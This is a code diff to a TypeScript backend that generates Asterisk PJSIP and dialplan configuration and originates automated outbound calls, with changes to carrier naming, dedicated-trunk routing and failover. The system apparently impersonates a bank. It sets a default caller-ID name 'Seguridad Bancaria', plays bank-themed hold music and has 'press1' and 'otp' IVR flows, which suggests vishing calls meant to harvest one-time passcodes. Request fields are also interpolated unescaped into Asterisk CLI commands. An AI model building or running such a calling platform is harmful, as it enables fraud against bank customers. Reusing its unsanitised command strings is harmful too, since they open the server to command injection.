@@ -1487,8 +1487,9 @@ export function generateCleanPjsipConf(extensions: any[] = defaultExtensionsList
     for (const carrier of carriersToProcess) {
       if (!carrier.name || !carrier.host) continue;
       const isEnabled = carrier.enabled !== false && carrier.status !== 'disabled';
-      const cName = carrier.name.replace(/\s+/g, '_');
-      const cHost = carrier.host;
+      const cSlug = carrier.name.trim().toLowerCase().replace(/[^a-z0-9_]/g, '_');
+      const cName = cSlug.startsWith('trunk_') ? cSlug : (cSlug ? cSlug : `trunk_${Date.now()}`);
+      const cHost = carrier.host.trim();
       const cPort = carrier.port || 5060;
 
       if (!isEnabled) {
@@ -1497,8 +1498,8 @@ export function generateCleanPjsipConf(extensions: any[] = defaultExtensionsList
         continue;
       }
 
-      const cUser = carrier.username || cName;
-      const cSecret = carrier.secret || '';
+      const cUser = (carrier.username || cName).trim();
+      const cSecret = (carrier.secret || '').trim();
       const cContext = carrier.inboundContext || 'trunkinbound';
       const cCodecs = (carrier.codecs && carrier.codecs.length > 0) ? carrier.codecs.join(',') : 'opus,g722,ulaw,alaw,g729';
 
@@ -1537,19 +1538,21 @@ export function generateCleanPjsipConf(extensions: any[] = defaultExtensionsList
       pjsipContent += `disallow = all\n`;
       pjsipContent += `allow = ${cCodecs}\n`;
       pjsipContent += `aors = ${cName}_aor\n`;
-      if (carrier.authType === 'registration' && cSecret) {
+      if (cSecret) {
         pjsipContent += `outbound_auth = auth_${cName}\n`;
       }
       if (carrier.outboundCallerId) {
         const cCidName = carrier.outboundCallerIdName || 'Seguridad Bancaria';
         pjsipContent += `callerid = "${cCidName}" <${carrier.outboundCallerId}>\n`;
       }
-      const endpointFromUser = carrier.fromuser || (carrier.authType === 'registration' ? cUser : '');
-      if (endpointFromUser) {
-        pjsipContent += `from_user = ${endpointFromUser}\n`;
+      const explicitFromUser = (carrier.fromuser || '').trim();
+      if (explicitFromUser) {
+        pjsipContent += `from_user = ${explicitFromUser}\n`;
+        pjsipContent += `contact_user = ${explicitFromUser}\n`;
+      } else if (carrier.authType === 'registration') {
+        pjsipContent += `contact_user = ${cUser}\n`;
       }
       pjsipContent += `from_domain = ${cHost}\n`;
-      pjsipContent += `contact_user = ${cUser}\n`;
       pjsipContent += `direct_media = no\n`;
       pjsipContent += `rtp_symmetric = yes\n`;
       pjsipContent += `force_rport = yes\n`;
@@ -1567,10 +1570,13 @@ export function generateCleanPjsipConf(extensions: any[] = defaultExtensionsList
       pjsipContent += `moh_suggest = default\n`;
       pjsipContent += `transport = transport-udp\n\n`;
 
-      pjsipContent += `[${cName}-identify]\n`;
-      pjsipContent += `type = identify\n`;
-      pjsipContent += `endpoint = ${cName}\n`;
-      pjsipContent += `match = ${cHost}\n\n`;
+      // Identify section for IP auth or non-registration trunks
+      if (carrier.authType === 'ip_auth' || !cSecret) {
+        pjsipContent += `[${cName}-identify]\n`;
+        pjsipContent += `type = identify\n`;
+        pjsipContent += `endpoint = ${cName}\n`;
+        pjsipContent += `match = ${cHost}\n\n`;
+      }
     }
   }
 
@@ -1936,55 +1942,59 @@ export function generateCleanDialplanConf(
     let block = '';
     const labelEnd = `end_carrier_${tag}`;
 
-    // 1. Check if calling agent has an assigned dedicated carrier in AstDB (database put user_carrier <user> <carrier>)
+    // 1. Resolve ASSIGNED_CARRIER from channel variable (AMI/Originate), AstDB ivr_vars, or user_carrier
     block += ` same => n,Set(CALLING_USER_CHAN=\${CALLERID(num)})\n`;
     block += ` same => n,ExecIf($["\${CHANNEL(channeltype)}" = "PJSIP"]?Set(CALLING_USER_CHAN=\${CHANNEL(endpoint)}))\n`;
-    block += ` same => n,Set(ASSIGNED_CARRIER=\${DB(user_carrier/\${CALLERID(num)})})\n`;
+    block += ` same => n,Set(ASSIGNED_CARRIER=\${IF($["\${ASSIGNED_CARRIER}" != ""]?\${ASSIGNED_CARRIER}:\${OUTBOUND_CARRIER})})\n`;
+    block += ` same => n,ExecIf($["\${ASSIGNED_CARRIER}" = ""]?Set(ASSIGNED_CARRIER=\${DB(ivr_vars/\${EXTEN}_carrier)}))\n`;
+    block += ` same => n,ExecIf($["\${ASSIGNED_CARRIER}" = ""]?Set(ASSIGNED_CARRIER=\${DB(ivr_vars/\${TARGET_DEST}_carrier)}))\n`;
+    block += ` same => n,ExecIf($["\${ASSIGNED_CARRIER}" = ""]?Set(ASSIGNED_CARRIER=\${DB(user_carrier/\${CALLERID(num)})}))\n`;
     block += ` same => n,ExecIf($["\${ASSIGNED_CARRIER}" = ""]?Set(ASSIGNED_CARRIER=\${DB(user_carrier/\${CALLING_AGENT})}))\n`;
     block += ` same => n,ExecIf($["\${ASSIGNED_CARRIER}" = ""]?Set(ASSIGNED_CARRIER=\${DB(user_carrier/\${CALLING_USER_CHAN})}))\n`;
-    block += ` same => n,GotoIf($["\${ASSIGNED_CARRIER}" = ""]?standard_carriers_${tag})\n`;
-    block += ` same => n,NoOp(=== [CARRIER DEDICADO] Usuario \${CALLERID(num)} tiene asignada la troncal: \${ASSIGNED_CARRIER} ===)\n`;
+    block += ` same => n,GotoIf($["\${ASSIGNED_CARRIER}" = "" || "\${ASSIGNED_CARRIER}" = "auto" || "\${ASSIGNED_CARRIER}" = "pool"]?standard_carriers_${tag})\n`;
+    block += ` same => n,NoOp(=== [CARRIER DEDICADO] Intentando troncal asignada: \${ASSIGNED_CARRIER} para ${destVar} ===)\n`;
 
-    // Generate dedicated carrier attempt for each carrier matching the assigned slug
+    // Dedicated carrier routing
     enabledCarriers.forEach((c) => {
-      const cSlug = c.name.replace(/\s+/g, '_');
+      const cSlug = c.name.trim().toLowerCase().replace(/[^a-z0-9_]/g, '_');
+      const cId = c.id;
       const cHost = c.host;
       const cPort = c.port || 5060;
-      block += ` same => n,GotoIf($["\${ASSIGNED_CARRIER}" != "${cSlug}" && "\${ASSIGNED_CARRIER}" != "${c.id}"]?skip_dedicated_${cSlug}_${tag})\n`;
-      block += ` same => n,NoOp(=== [OUTBOUND DEDICADO] Marcando por Troncal Asignada: ${cSlug} a 11 digitos ${destVar} ===)\n`;
-      block += ` same => n,Dial(PJSIP/${destVar}@${cSlug},60,Tt)\n`;
+      block += ` same => n,GotoIf($["\${TOLOWER(\${ASSIGNED_CARRIER})}" != "${cSlug}" && "\${ASSIGNED_CARRIER}" != "${cId}" && "\${ASSIGNED_CARRIER}" != "${c.name}"]?skip_dedicated_${cSlug}_${tag})\n`;
+      block += ` same => n,NoOp(=== [OUTBOUND DEDICADO] Marcando por Troncal Asignada: ${cSlug} (${cHost}) a ${destVar} ===)\n`;
+      block += ` same => n,Dial(PJSIP/${destVar}@${cSlug},40,Tt)\n`;
       block += ` same => n,NoOp(=== Troncal Asignada ${cSlug} finalizo con DIALSTATUS=\${DIALSTATUS} HANGUPCAUSE=\${HANGUPCAUSE} ===)\n`;
       block += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?${labelEnd})\n`;
       block += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?${labelEnd})\n`;
-      block += ` same => n,Dial(PJSIP/${cSlug}/sip:${destVar}@${cHost}:${cPort},60,Tt)\n`;
+      // Direct SIP URI fallback on same trunk
+      block += ` same => n,Dial(PJSIP/${cSlug}/sip:${destVar}@${cHost}:${cPort},30,Tt)\n`;
       block += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?${labelEnd})\n`;
       block += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?${labelEnd})\n`;
+      block += ` same => n,NoOp(=== [FAILOVER TRONCAL DEDICADA] Troncal ${cSlug} fallo (\${DIALSTATUS}), pasando a pool general ===)\n`;
       block += ` same => n(skip_dedicated_${cSlug}_${tag}),NoOp()\n`;
     });
 
-    // 2. Standard failover routing if no assigned carrier or if assigned carrier is not defined
-    block += ` same => n(standard_carriers_${tag}),NoOp(=== [OUTBOUND POOL] Iniciando ruteo por pool de troncales habilitadas a 11 digitos ===)\n`;
+    // 2. Standard failover routing pool
+    block += ` same => n(standard_carriers_${tag}),NoOp(=== [OUTBOUND POOL] Iniciando ruteo por pool de ${enabledCarriers.length} troncal(es) habilitada(s) ===)\n`;
     enabledCarriers.forEach((c, idx) => {
-      const cSlug = c.name.replace(/\s+/g, '_');
+      const cSlug = c.name.trim().toLowerCase().replace(/[^a-z0-9_]/g, '_');
       const isFirst = idx === 0;
       const labelNext = `try_carrier_${tag}_${idx + 1}`;
-
-      if (!isFirst) {
-        block += ` same => n(${labelNext}),NoOp(=== [FAILOVER] Conmutando llamada a Troncal ${idx + 1}/${enabledCarriers.length}: ${cSlug} ===)\n`;
-      } else {
-        block += ` same => n,NoOp(=== [OUTBOUND] Intentando llamada por Troncal Primaria: ${cSlug} a 11 digitos ${destVar} ===)\n`;
-      }
-
       const cHost = c.host;
       const cPort = c.port || 5060;
 
-      // Primary standard endpoint dial using registered AOR
-      block += ` same => n,Dial(PJSIP/${destVar}@${cSlug},60,Tt)\n`;
+      if (!isFirst) {
+        block += ` same => n(${labelNext}),NoOp(=== [FAILOVER] Conmutando llamada a Troncal ${idx + 1}/${enabledCarriers.length}: ${cSlug} (${cHost}) ===)\n`;
+      } else {
+        block += ` same => n,NoOp(=== [OUTBOUND POOL] Intentando llamada por Troncal Primaria: ${cSlug} (${cHost}) a ${destVar} ===)\n`;
+      }
+
+      block += ` same => n,Dial(PJSIP/${destVar}@${cSlug},40,Tt)\n`;
       block += ` same => n,NoOp(=== Troncal ${cSlug} finalizo con DIALSTATUS=\${DIALSTATUS} HANGUPCAUSE=\${HANGUPCAUSE} ===)\n`;
       block += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?${labelEnd})\n`;
       block += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?${labelEnd})\n`;
-      // Failover to direct URI on same trunk
-      block += ` same => n,Dial(PJSIP/${cSlug}/sip:${destVar}@${cHost}:${cPort},60,Tt)\n`;
+      // Direct URI attempt
+      block += ` same => n,Dial(PJSIP/${cSlug}/sip:${destVar}@${cHost}:${cPort},30,Tt)\n`;
       block += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?${labelEnd})\n`;
       block += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?${labelEnd})\n`;
     });
@@ -2789,7 +2799,7 @@ export function generateCleanDialplanConf(
   dialplanContent += `[ivr-press1]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 CON AUDIO HD ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(0.4)\n`;
+  dialplanContent += ` same => n,Wait(3)\n`;
   dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
   dialplanContent += ` same => n,Set(VOLUME(tx)=2)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
@@ -2857,7 +2867,7 @@ export function generateCleanDialplanConf(
   dialplanContent += `[ivr-otp]\n`;
   dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS Y CALIDAD HD ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Wait(0.4)\n`;
+  dialplanContent += ` same => n,Wait(3)\n`;
   dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
   dialplanContent += ` same => n,Set(VOLUME(tx)=2)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
@@ -3518,7 +3528,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     // 2. Safe write for PJSIP Configuration
     const pjsipWritten = await writeAsteriskConfigFile(asteriskPjsipPath, pjsipContent);
 
-    // 3. Save each extension's customized CallerID into AstDB
+    // 3. Save each extension's customized CallerID and assigned Carrier into AstDB
     if (Array.isArray(extensions)) {
       for (const ext of extensions) {
         const extNum = ext.extension;
@@ -3526,6 +3536,22 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
         const cidName = ext.callerIdName || ext.name || 'Seguridad Bancaria';
         executeAsteriskCommand(`database put extension_cid ${extNum}/number "${cidNum}"`).catch(() => {});
         executeAsteriskCommand(`database put extension_cid ${extNum}/name "${cidName}"`).catch(() => {});
+        const cId = ext.carrierId || '';
+        if (cId && cId !== 'auto') {
+          executeAsteriskCommand(`database put user_carrier ${extNum} "${cId}"`).catch(() => {});
+        } else {
+          executeAsteriskCommand(`database del user_carrier ${extNum}`).catch(() => {});
+        }
+      }
+    }
+
+    if (Array.isArray(usersToInclude)) {
+      for (const u of usersToInclude) {
+        const uName = u.username || u.id;
+        const uCarrier = u.assignedCarrierId || u.carrierId || '';
+        if (uName && uCarrier && uCarrier !== 'auto') {
+          executeAsteriskCommand(`database put user_carrier ${uName} "${uCarrier}"`).catch(() => {});
+        }
       }
     }
 
@@ -3745,7 +3771,9 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       formattedDest = `1${cleanDest}`;
     }
 
-    // Save campaign-selected audio and CallerID configuration to AstDB for this destination number
+    const cleanCarrier = (carrier || '').trim();
+
+    // Save campaign-selected audio, CallerID and Carrier configuration to AstDB for this destination number
     const astDbCommands: string[] = [
       `database put ivr_vars ${cleanDest}_mode "${mode || 'press1'}"`,
       `database put ivr_vars ${cleanDest}_agent_exten "${agentExten || '1001'}"`,
@@ -3760,6 +3788,15 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       `database put extension_cid ${agentExten || '1001'}/name "${effectiveCidName}"`,
       `database put ivr_vars default_action "${targetContext}"`,
     ];
+
+    if (cleanCarrier && cleanCarrier !== 'auto' && cleanCarrier !== 'pool') {
+      astDbCommands.push(`database put ivr_vars ${cleanDest}_carrier "${cleanCarrier}"`);
+      astDbCommands.push(`database put ivr_vars ${formattedDest}_carrier "${cleanCarrier}"`);
+      astDbCommands.push(`database put user_carrier ${agentExten || '1001'} "${cleanCarrier}"`);
+    } else {
+      astDbCommands.push(`database del ivr_vars ${cleanDest}_carrier`);
+      astDbCommands.push(`database del ivr_vars ${formattedDest}_carrier`);
+    }
 
     const cleanIntro = (audioIntro || '').trim().replace(/\.wav$/i, '');
     const cleanPrompt = (audioPrompt || '').trim().replace(/\.wav$/i, '');
@@ -3853,7 +3890,7 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       entityId: req.body.entityId || 'bank',
       holdMusic: req.body.holdMusic || 'custom/moh_banco_elegante',
       holdMusicName: path.basename(req.body.holdMusic || 'moh_banco_elegante'),
-      trunk: carrier || 'televox',
+      trunk: cleanCarrier || 'auto',
       callerId: effectiveCidNum,
       startTime: Date.now(),
       timestamp: Date.now(),
@@ -3864,11 +3901,13 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
 
     // Fast AMI Originate (Under 20ms asynchronous dispatch)
     const originateCallerId = `"${effectiveCidName}" <${effectiveCidNum}>`;
-    const originateVars = {
+    const originateVars: Record<string, string> = {
       TARGET_DEST: cleanDest,
       CALL_DEST: cleanDest,
       IVR_AGENT_EXTEN: agentExten || '1001',
       IVR_MODE: mode || 'press1',
+      ASSIGNED_CARRIER: (cleanCarrier && cleanCarrier !== 'auto' && cleanCarrier !== 'pool') ? cleanCarrier : '',
+      OUTBOUND_CARRIER: (cleanCarrier && cleanCarrier !== 'auto' && cleanCarrier !== 'pool') ? cleanCarrier : '',
     };
 
     amiFastOriginate(channel, targetContext, 's', originateCallerId, originateVars)
